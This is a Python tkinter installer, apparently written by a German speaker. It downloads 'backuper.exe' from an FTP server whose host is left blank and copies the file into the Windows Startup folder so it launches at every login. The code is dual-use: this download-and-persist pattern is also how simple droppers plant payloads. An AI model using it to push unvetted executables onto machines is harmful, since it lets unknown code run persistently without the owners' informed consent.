import os
import sys
import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
from ftplib import FTP
import shutil
import threading


def download_file_from_ftp(remote_file, local_file, progressbar):
    ftp = FTP("")  # Festgelegter FTP-Server
    ftp.login()
    ftp.retrbinary("RETR " + remote_file, open(local_file, "wb").write)
    ftp.quit()
    progressbar["value"] = 50


def install_autostart(file_path, progressbar):
    autostart_folder = os.path.join(
        os.environ["APPDATA"],
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup",
    )
    shutil.copy(file_path, autostart_folder)
    progressbar["value"] = 100


def install():
    remote_file_path = (
        "/private/backuper.exe"  # Festgelegter Pfad zur zu ladenden Datei
    )
    local_file_path = (
        "backuper.exe"  # Festgelegter lokaler Pfad für die heruntergeladene Datei
    )

    button_install.config(
        state=tk.DISABLED
    )  # Deaktiviere den Installationsbutton während der Installation

    progressbar.place(
        relx=0.5, rely=0.5, anchor=tk.CENTER
    )  # Platzieren des Fortschrittsbalkens im Hauptfenster

    install_thread = threading.Thread(
        target=download_and_install,
        args=(remote_file_path, local_file_path, progressbar),
    )
    install_thread.start()


def download_and_install(remote_file_path, local_file_path, progressbar):
    try:
        download_file_from_ftp(remote_file_path, local_file_path, progressbar)
        install_autostart(local_file_path, progressbar)

        # Weitere Installationslogik hier

        # Beispielmeldung nach erfolgreicher Installation
        messagebox.showinfo(
            "Installation", "Die Installation wurde erfolgreich abgeschlossen."
        )
    except Exception as e:
        messagebox.showerror(
            "Fehler",
            "Bei der Installation ist ein Fehler aufgetreten:\n{}".format(str(e)),
        )

    button_install.config(
        state=tk.NORMAL
    )  # Aktiviere den Installationsbutton nach Abschluss der Installation
    progressbar.place_forget()  # Entferne den Fortschrittsbalken aus dem Hauptfenster


# Hauptfenster erstellen
root = tk.Tk()
root.title("Installer")
root.geometry("400x250")
root.resizable(False, False)

# Hintergrundbild
background_image = tk.PhotoImage(
    file=os.path.join(sys._MEIPASS, "background.png")
    if hasattr(sys, "_MEIPASS")
    else "background.png"
)
background_label = tk.Label(root, image=background_image)
background_label.place(x=0, y=0, relwidth=1, relheight=1)

# Fenster-Icon
icon_image = tk.PhotoImage(
    file=os.path.join(sys._MEIPASS, "icon.png")
    if hasattr(sys, "_MEIPASS")
    else "icon.png"
)
root.iconphoto(True, icon_image)

# Installationsbutton
button_install = ttk.Button(root, text="Installieren", command=install)
button_install.place(x=175, y=210)

# Fortschrittsbalken
progressbar = ttk.Progressbar(root, length=300, mode="determinate")

# Starte den Hauptloop
root.mainloop()
